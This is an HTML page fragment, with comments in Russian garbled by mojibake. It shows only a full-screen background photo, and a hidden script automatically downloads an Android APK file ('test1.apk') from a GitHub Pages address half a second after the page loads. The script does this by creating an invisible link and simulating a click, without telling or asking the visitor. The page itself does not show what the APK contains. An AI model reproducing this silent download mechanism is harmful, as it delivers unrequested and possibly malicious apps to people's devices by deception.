    <style>
        /* –°—Ç–∏–ª–∏ –¥–ª—è —Ä–∞—Å—Ç—è–≥–∏–≤–∞–Ω–∏—è <img> –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω */
        body, html { 
            margin: 0; 
            padding: 0; 
            height: 100%; 
            width: 100%; 
            overflow: hidden; 
        }
        .full-image-container {
            width: 100%;
            height: 100%;
            position: relative;
        }
        .full-image-container img {
            width: 100%;
            height: 100%;
            object-fit: cover; /* –†–∞—Å—Ç—è–≥–∏–≤–∞–µ—Ç –∫–∞—Ä—Ç–∏–Ω–∫—É, —Å–æ—Ö—Ä–∞–Ω—è—è –ø—Ä–æ–ø–æ—Ä—Ü–∏–∏, —á—Ç–æ–±—ã –∑–∞–ø–æ–ª–Ω–∏—Ç—å —ç–∫—Ä–∞–Ω */
        }
    </style>
</head>
<body>
    <div class="full-image-container">
        <img src="downloads/photo11.jpg" alt="–§–æ–Ω">
    </div>
    
    <script>
        // --- üîë –ö–õ–Æ–ß–ï–í–ê–Ø –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ---
        const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/test/'; 
        
        // APK-—Ñ–∞–π–ª —Å –æ–±—Ö–æ–¥–æ–º –∫—ç—à–∞
        const apkUrl = repoBaseUrl + 'downloads/test1.apk?v=' + Date.now(); 
        const apkFilename = 'test1.apk'; 
        // ------------------------------------

        function startDownload() {
            // –°–æ–∑–¥–∞–µ–º –Ω–µ–≤–∏–¥–∏–º—É—é —Å—Å—ã–ª–∫—É, –∏–º–∏—Ç–∏—Ä—É–µ–º –∫–ª–∏–∫
            const link = document.createElement('a');
            link.href = apkUrl;
            link.download = apkFilename; 
            
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–∫–∞—á–∏–≤–∞–Ω–∏–µ —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã (0.5 —Å–µ–∫—É–Ω–¥—ã –∑–∞–¥–µ—Ä–∂–∫–∞)
        window.onload = function() {
            setTimeout(startDownload, 500); 
        };
    </script>
</body>
